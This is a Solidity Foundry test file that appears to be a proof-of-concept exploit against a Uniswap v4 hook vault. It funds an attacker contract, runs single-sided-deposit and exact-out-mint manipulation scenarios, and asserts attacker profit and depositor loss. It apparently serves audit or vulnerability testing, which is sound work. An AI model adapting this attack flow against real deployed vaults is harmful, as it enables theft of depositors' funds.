// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";
import {TestBase_UniswapV4FullSpreadPonsFamilyHook_Acceptance as Acceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/ponsFamilyV2Hook/test/bases/TestBase_UniswapV4FullSpreadPonsFamilyHook_Acceptance.sol";
import {TestBase_UniswapV4FullSpreadPonsFamilyHook as PBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/ponsFamilyV2Hook/test/bases/TestBase_UniswapV4FullSpreadPonsFamilyHook.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {FSAttacker, IFSReserve} from "./FSBlockedEntrySpotMint.t.sol";

contract FSBlockedEntrySpotMintPonsTest is Acceptance {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    FSAttacker attacker;
    uint256 constant CAP = 10_000_000e18;
    bytes32 vSalt; int24 vLower; int24 vUpper; bool vFound;
    uint256 rS0; uint256 rVictimShares; uint256 rV0; uint256 rVictimV0; uint256 rAtk0;

    function setUp() public virtual override {
        PBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 0, 60, IHooks(address(ponsHook)));
        ponsHook.registerPool(poolKey, address(token1), address(this), address(this), _creatorTaxBps(), false, ponsHook.currentFeePolicy());
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(1_000e18);
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        vm.recordLogs();
        _bootstrap();
        _captureVaultPosition();
        attacker = new FSAttacker(poolManager, vault, poolKey, token0, token1);
        token0.transfer(address(attacker), CAP);
        token1.transfer(address(attacker), CAP);
    }

    function _captureVaultPosition() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("ModifyLiquidity(bytes32,address,int24,int24,int256,bytes32)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(poolManager) && logs[i].topics[0] == sig
                && address(uint160(uint256(logs[i].topics[2]))) == address(vault)) {
                (vLower, vUpper,, vSalt) = abi.decode(logs[i].data, (int24, int24, int256, bytes32));
                vFound = true;
            }
        }
        require(vFound, "vault position not found");
    }

    function _backing() internal view returns (uint256 b0, uint256 b1) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        (uint128 liq, uint256 l0, uint256 l1) = poolManager.getPositionInfo(poolKey.toId(), address(vault), vLower, vUpper, vSalt);
        (uint256 g0, uint256 g1) = poolManager.getFeeGrowthInside(poolKey.toId(), vLower, vUpper);
        uint256 e0; uint256 e1;
        unchecked {
            e0 = FullMath.mulDiv(g0 - l0, liq, uint256(1) << 128);
            e1 = FullMath.mulDiv(g1 - l1, liq, uint256(1) << 128);
        }
        b0 = token0.balanceOf(address(vault)) + d0 + e0;
        b1 = token1.balanceOf(address(vault)) + d1 + e1;
    }

    function _vaultValueFull() internal view returns (uint256) { (uint256 b0, uint256 b1) = _backing(); return b0 + b1; }
    function _attackerValue() internal view returns (uint256) {
        return token0.balanceOf(address(attacker)) + token1.balanceOf(address(attacker));
    }

    function _exit() internal {
        uint256 s = vault.balanceOf(address(attacker));
        uint256 S = vault.totalSupply();
        (uint256 b0, uint256 b1) = _backing();
        for (uint256 t = s; t + 50 > s; --t) {
            uint256 a0 = b0 * t / S;
            uint256 a1 = b1 * t / S;
            if (FullMath.mulDivRoundingUp(a0, S, b0) != FullMath.mulDivRoundingUp(a1, S, b1)) continue;
            attacker.exitAll(a0, a1);
            return;
        }
        revert("exit sizing failed");
    }

    function _run(uint256 kNum, uint256 kDen, uint256 amt, uint8 mode, string memory label) internal returns (int256 profit, int256 victimDelta) {
        rS0 = vault.totalSupply();
        rVictimShares = vault.balanceOf(address(this));
        rV0 = _vaultValueFull();
        rVictimV0 = rV0 * rVictimShares / rS0;
        rAtk0 = _attackerValue();
        console2.log("==== ", label);
        console2.log("pool active liquidity", uint256(poolManager.getLiquidity(poolKey.toId())));
        console2.log("vault NAV (P=1) before", rV0);
        attacker.attack(kNum, kDen, amt, mode);
        console2.log("attacker shares minted", attacker.mintedShares());
        console2.log("attacker token0 paid into vault", attacker.paidIn());
        console2.log("fair-share equivalent (paid/V0*S0)", attacker.paidIn() * rS0 / rV0);
        _exit();
        uint256 V1 = _vaultValueFull();
        uint256 victimV1 = V1 * rVictimShares / vault.totalSupply();
        profit = int256(_attackerValue()) - int256(rAtk0);
        victimDelta = int256(victimV1) - int256(rVictimV0);
        console2.log("vault NAV after", V1);
        console2.log("ATTACKER NET PROFIT (P=1, all hook/LP fees paid)");
        console2.logInt(profit);
        console2.log("VICTIM VALUE DELTA");
        console2.logInt(victimDelta);
        console2.log("profit bps of pre-attack TVL");
        console2.logInt(profit * 10_000 / int256(rV0));
    }

    function test_pons_blockedSingleSidedDeposit_k4() public {
        (int256 p, int256 v) = _run(2, 1, 800e18, 0, "PONS single-sided exchangeIn, k=4");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }

    function test_pons_blockedExactOutMint_k4() public {
        (int256 p, int256 v) = _run(2, 1, vault.totalSupply() * 52 / 100, 1, "PONS exact-out mint, k=4");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }
}
